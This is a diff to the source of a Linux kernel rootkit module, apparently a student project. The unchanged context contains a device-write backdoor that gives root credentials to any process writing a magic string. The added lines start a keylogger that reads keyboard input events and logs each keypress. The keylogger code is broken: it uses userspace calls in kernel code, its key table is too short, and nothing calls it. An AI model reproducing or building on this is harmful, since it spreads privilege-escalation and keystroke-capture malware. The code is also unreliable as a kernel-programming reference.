@@ -3,6 +3,8 @@
 // 2019-10-24
 // Linux Kernel Module Rootkit
 
+#include <stdio.h>
+
 #include <linux/module.h>	/* Needed by all modules */
 #include <linux/kallsyms.h> /* for kallsyms_lookup_name */
 #include <linux/init.h>
@@ -17,6 +19,10 @@
 #include <linux/cred.h>
 #include <linux/version.h>
 
+#include <linux/input.h>
+#include <linux/fcntl.h>
+
+
 // *********************************************************************
 // module metadata and get rid of taint message
 // *********************************************************************
@@ -25,6 +31,8 @@ MODULE_LICENSE("GPL");
 
 #define DRIVER_AUTHOR "Alex&Andrew"
 #define DRIVER_DESC   "rootkit"
+
+#define UK "[Unknown]"
 
 MODULE_AUTHOR(DRIVER_AUTHOR);
 MODULE_DESCRIPTION(DRIVER_DESC);
@@ -58,6 +66,10 @@ static int            majorNumber;
 static struct class*  rootcharClass		= NULL;
 static struct device* rootcharDevice	= NULL;
 static int    				numberOpens 		= 0;
+
+static char* scancode_to_ascii[] = {		//scancode for keylogger
+	UK, "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"
+};
 
 static struct file_operations fops =
 {
@@ -157,6 +169,7 @@ static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, lo
 {
 	printk ("Device write\n");
 	char   magic[] = "CS493";
+	char   logger[] = "keylogger";
 	struct cred *new_cred;
 	if (memcmp(buf, magic, (int)sizeof(magic)-1) == 0) 	// compares data and magic
 	{
@@ -173,7 +186,40 @@ static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, lo
 		V(new_cred->fsuid) = V(new_cred->fsgid) = 0;
 		commit_creds (new_cred);													// saves creds
 	}
+	else if(memcmp(buf, logger, (int)sizeof(logger)-1) == 0)
+	{
+		printk("Keylogger activated\n");
+	}
 	return len;
+}
+
+static int run_keylogger()
+{
+	int shift_pressed = 0;
+	int caps_pressed = 0;
+
+	int fd;
+	fd = open("/dev/input/event2", O_RDONLY);
+	struct input_event ev;
+
+	while(1)
+	{
+		read(fd, & ev, sizeof(struct input_event));
+		
+		if(ev.type == 1)
+		{
+			if(ev.value == 1)
+			{
+				printk("Key %s pressed\n", scancode_to_ascii[ev.code]);
+			}
+			if(ev.value == 0)
+			{
+				printk("Key %s released\n", scancode_to_ascii[ev.code]);
+			}
+		}
+	}
+
+	return 0;
 }
 
 // Called when the device is closed in user space.
